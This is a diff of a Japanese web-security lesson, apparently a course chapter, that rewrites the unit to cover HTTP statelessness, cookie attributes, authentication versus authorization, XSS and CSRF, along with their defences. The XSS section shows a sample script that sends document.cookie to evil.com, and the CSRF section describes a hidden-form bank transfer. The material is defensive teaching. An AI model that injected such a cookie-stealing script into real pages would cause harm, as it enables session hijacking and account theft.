@@ -1,197 +1,102 @@
-# 認証の基礎
+# 認証とセキュリティ — HTTP がステートレスだから Cookie が必要になった
 
 ## 今日のゴール
 
+- HTTP がステートレスであること、それを補う Cookie の仕組みを知る
 - 認証と認可の違いを知る
-- Cookie / Session / JWT の仕組みを知る
-- OAuth の概念を知る
-- Next.js での認証フロー（Auth.js）の全体像を知る
+- XSS と CSRF がどういう攻撃か、なぜ防御が必要かを知る
 
-## 認証と認可
+## HTTP はリクエストごとに「初対面」
 
-まず、よく混同される 2 つの概念を明確にします。
+HTTP はステートレスなプロトコルです。サーバーはリクエストを 1 つ受け取って 1 つ返すだけで、前のリクエストのことを覚えていません。
 
-- **認証（Authentication）** — 「あなたは誰ですか？」を確認すること。ログイン処理
-- **認可（Authorization）** — 「あなたにはその操作の権限がありますか？」を確認すること。アクセス制御
-
-```
-例: 会社のオフィスビル
-- 認証 = 社員証で入館ゲートを通る（本人確認）
-- 認可 = 社員証のランクで入れるフロアが決まる（権限確認）
-```
-
-Web アプリケーションでは、まず認証（ログイン）でユーザーを識別し、次に認可でそのユーザーの権限に基づいてアクセスを制御します。
-
-## HTTP はステートレス
-
-Web の通信プロトコルである HTTP は**ステートレス**（stateless）です。つまり、サーバーは 1 つのリクエストが終わると、次のリクエストが同じユーザーかどうかわかりません。
-
-```
-リクエスト1: GET /dashboard → サーバー:「誰？」
-リクエスト2: GET /settings  → サーバー:「誰？」（同じ人かわからない）
-```
-
-これでは、ページを移動するたびにログインが必要になってしまいます。この問題を解決するのが Cookie と Session です。
-
-## Cookie
-
-**Cookie** は、ブラウザに保存される小さなデータです。サーバーがレスポンスで「この情報を保存しておいて」とブラウザに指示し、ブラウザは次のリクエストからその情報を自動的に送ります。
+つまり「ログインした」というリクエストの後に「マイページを見たい」というリクエストを送っても、サーバーにとっては**別人**です。
 
 ```mermaid
 sequenceDiagram
     participant B as ブラウザ
     participant S as サーバー
-
-    Note over B,S: 1. ログインリクエスト
-    B->>S: メール: user@example.com、パスワード: ****
-
-    Note over B,S: 2. サーバーが Cookie を設定
-    S-->>B: ログイン成功（Set-Cookie: session_id=abc123）
-
-    Note over B,S: 3. 以降のリクエスト
-    B->>S: GET /dashboard（Cookie: session_id=abc123 が自動で付く）
-    Note over S: abc123 は太郎さんだな
-    S-->>B: 太郎さんのダッシュボード
+    B->>S: ログイン（ID: tanaka, PW: ****）
+    S-->>B: ログイン成功 + Cookie を返す
+    B->>S: マイページ（Cookie を自動送信）
+    Note over S: Cookie でログイン済みと判断
+    S-->>B: マイページの HTML
 ```
 
-### Cookie のセキュリティ属性
+## Cookie — 「覚えておいてもらう」ための仕組み
+
+Cookie は、サーバーがブラウザに「これを持っておいて、次のリクエストのときに送り返して」と渡す小さなデータです。
+
+ログイン成功時にサーバーが Cookie を返し、ブラウザが以降のリクエストに自動的に Cookie を付けることで、「さっきログインした人だ」とサーバーが判断できます。
 
 ```
-Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400
+Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
 ```
-
-`Set-Cookie` はサーバーがレスポンスに含める HTTP ヘッダーで、ブラウザに Cookie の保存を指示します。
 
 | 属性 | 意味 |
 |------|------|
-| `HttpOnly` | JavaScript からアクセスできない（XSS（悪意あるスクリプト注入）対策） |
-| `Secure` | HTTPS（HTTP の暗号化版）でのみ送信される |
-| `SameSite=Strict` | 同一サイトからのリクエストでのみ送信される（CSRF（別サイトからの偽リクエスト）対策） |
-| `Path=/` | Cookie が有効なパス |
-| `Max-Age=86400` | 有効期限（秒）。86400 = 24 時間 |
+| `HttpOnly` | JavaScript からアクセスできない（XSS 対策） |
+| `Secure` | HTTPS でのみ送信される |
+| `SameSite=Strict` | 同じサイトからのリクエストでのみ送信（CSRF 対策） |
 
-## Session（セッション）
+## 認証と認可
 
-**Session** は、サーバー側でユーザーの状態を管理する仕組みです。
+Web アプリのセキュリティでよく出てくる 2 つの概念です。
 
-```
-サーバーのセッションストア:
-{
-  "abc123": { userId: 1, name: "太郎", role: "admin" },
-  "def456": { userId: 2, name: "花子", role: "user" }
-}
-```
-
-ブラウザから送られる Cookie のセッション ID（`abc123`）をキーにして、サーバーがユーザー情報を参照します。ユーザー情報はサーバー側にあるため、ブラウザからは改ざんできません。
-
-## JWT（JSON Web Token）
-
-**JWT** はもう 1 つのアプローチで、ユーザー情報をトークン（署名された文字列）自体に含めます。
-
-```
-eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEsIm5hbWUiOiLlpKrpg44iLCJyb2xlIjoiYWRtaW4ifQ.xxxxx
-```
-
-この文字列は 3 つのパートから成り、ドット（`.`）で区切られています。
-
-```
-ヘッダー.ペイロード.署名
-
-ヘッダー: 使用しているアルゴリズム
-ペイロード: ユーザー情報（userId, name, role など）
-署名: 改ざん検知用（サーバーの秘密鍵で生成）
-```
-
-> **重要**: JWT のペイロードは Base64Url エンコード（バイナリデータを URL で安全に使える文字列に変換する方式）されているだけで、誰でもデコードして内容を読めます。JWT は改ざんを検知するための「署名」であり、内容を隠すための「暗号化」ではありません。パスワードなどの機密情報は JWT に含めないでください。
-
-### Session vs JWT
-
-| 特徴 | Session | JWT |
-|------|---------|-----|
-| ユーザー情報の保存場所 | サーバー | トークン自体 |
-| スケーラビリティ | サーバー間で共有が必要 | サーバー間共有不要 |
-| 無効化 | 即座にログアウト可能 | 有効期限まで無効化が難しい |
-| サイズ | Cookie は小さい（ID のみ） | トークンが大きくなりがち |
-
-どちらが優れているかは状況次第です。Auth.js は Session ベースをデフォルトとしています。
-
-## OAuth
-
-**OAuth**（Open Authorization）は、外部サービス（Google、GitHub など）のアカウントでログインする仕組みです。「Google でログイン」ボタンが OAuth の典型的な例です。
-
-### OAuth のフロー（簡略版）
+- **認証**（Authentication）: 「あなたは誰ですか？」— ログイン
+- **認可**（Authorization）: 「あなたはこれをしていいですか？」— 権限の確認
 
 ```mermaid
-sequenceDiagram
-    participant U as ユーザー
-    participant A as アプリ
-    participant G as Google
-
-    U->>A: 「Google でログイン」をクリック
-    A->>G: Google のログインページにリダイレクト
-    U->>G: ログイン & アプリへの権限を許可
-    G->>A: アプリにリダイレクト（認証コード付き）
-    A->>G: 認証コードでアクセストークンを要求
-    G-->>A: アクセストークン
-    A->>G: アクセストークンでユーザー情報を取得
-    G-->>A: ユーザー情報
-    Note over A: セッション作成 → ログイン完了
+flowchart LR
+  A["ユーザー"] -->|"認証: ログイン"| B["あなたは田中さん"]
+  B -->|"認可: 権限確認"| C["管理者ページを\n見ていいか？"]
 ```
 
-OAuth の重要な点は、**ユーザーのパスワードがアプリに渡らない**ことです。パスワードは Google（認証プロバイダ）だけが知っています。
+ログインは認証。管理者ページへのアクセス制御は認可。2 つは別の処理です。
 
-## Auth.js（NextAuth v5）による認証
+## XSS — 悪意のあるスクリプトを埋め込む攻撃
 
-**Auth.js**（旧 NextAuth.js、現在 v5）は、Next.js で認証を実装するためのライブラリです。OAuth プロバイダとの連携、Session 管理、JWT 処理などをまとめて扱えます。
+**XSS**（Cross-Site Scripting）は、攻撃者が Web ページに悪意のある JavaScript を埋め込む攻撃です。
 
-Auth.js の中心となるのは設定ファイルです。ここで「どの OAuth プロバイダを使うか」を定義し、認証に必要な関数をエクスポートします。
+たとえば掲示板にこう投稿されたとします。
 
-```ts
-// src/auth.ts
-import NextAuth from "next-auth";
-import GitHub from "next-auth/providers/github";
-
-export const { handlers, signIn, signOut, auth } = NextAuth({
-  providers: [
-    GitHub({
-      clientId: process.env.AUTH_GITHUB_ID!,
-      clientSecret: process.env.AUTH_GITHUB_SECRET!,
-    }),
-  ],
-});
+```html
+<script>
+  // Cookie を盗んで攻撃者のサーバーに送る
+  fetch("https://evil.com/steal?cookie=" + document.cookie);
+</script>
 ```
 
-この設定から得られる `handlers` を Route Handler（Day 38 参照）でエクスポートすると、ログイン・ログアウト・コールバックなどの認証エンドポイントが自動的に生成されます。
+この投稿がそのまま HTML に埋め込まれると、他のユーザーがページを開いたときに JavaScript が実行され、Cookie（セッション情報）が盗まれます。
 
-認証後のセッション情報は `auth()` 関数で取得できます。Server Component でもServer Action でも使えるのが特徴です。
+### 対策
 
-```tsx
-// src/app/dashboard/page.tsx
-import { auth } from "@/auth";
-import { redirect } from "next/navigation";
+- **ユーザー入力をエスケープする**: `<script>` を `&lt;script&gt;` に変換して、HTML として解釈されないようにする
+- **Cookie に `HttpOnly` を付ける**: JavaScript から Cookie にアクセスできなくする
+- React / Next.js では JSX に渡した文字列は**自動的にエスケープ**されるため、基本的に XSS は防がれます。ただし `dangerouslySetInnerHTML` を使うと無効になります
 
-export default async function DashboardPage() {
-  const session = await auth();
+## CSRF — ログイン状態を悪用する攻撃
 
-  if (!session) {
-    redirect("/api/auth/signin");
-  }
+**CSRF**（Cross-Site Request Forgery）は、ユーザーがログインした状態で悪意のあるサイトを開いたとき、そのサイトから本物のサイトにリクエストを送らせる攻撃です。
 
-  return (
-    <main>
-      <h1>ダッシュボード</h1>
-      <p>ようこそ、{session.user?.name} さん</p>
-    </main>
-  );
-}
+```mermaid
+flowchart LR
+  A["ユーザー\n（銀行にログイン中）"] -->|"悪意のあるサイトを開く"| B["evil.com"]
+  B -->|"隠しフォームで\n送金リクエスト"| C["bank.com\n（Cookie が自動送信される）"]
 ```
 
-ログイン・ログアウトのボタンは、Server Action として `signIn("github")` / `signOut()` を呼ぶ `<form>` として実装します。Day 40 で学んだ Middleware を使えば、複数のページをまとめて保護することもできます。
+ユーザーが銀行にログイン中に悪意のあるサイトを開くと、隠しフォームが銀行に送金リクエストを送ります。ブラウザは Cookie を自動で付けるため、銀行のサーバーは「本人のリクエストだ」と判断してしまいます。
+
+### 対策
+
+- **Cookie に `SameSite=Strict` を付ける**: 別サイトからのリクエストに Cookie を付けない
+- **CSRF トークン**: フォームにランダムなトークンを埋め込み、サーバー側で検証する
+- Next.js の Server Actions は CSRF トークンの仕組みを内部で持っています
 
 ## まとめ
 
-- 認証は「誰か」を確認、認可は「権限があるか」を確認する仕組み
-- Cookie と Session でステートレスな HTTP に状態を持たせる
-- JWT はトークン自体にユーザー情報を含める方式
-- OAuth は外部サービスのアカウントでログインする仕組み。パスワードがアプリに渡らない
-- Auth.js（NextAuth v5）を使うと、Next.js で OAuth やセッション管理を簡単に実装できる
+- HTTP はステートレスで、リクエストごとに独立しています。**Cookie** で「ログイン済み」を保持します
+- **認証**は「誰か」の確認、**認可**は「権限」の確認です
+- **XSS** は悪意のあるスクリプトの埋め込み。React の JSX は自動エスケープで基本的に防がれます
+- **CSRF** はログイン状態の悪用。`SameSite` Cookie や CSRF トークンで防ぎます
+- Next.js の Server Actions は CSRF 対策を内部で持っています
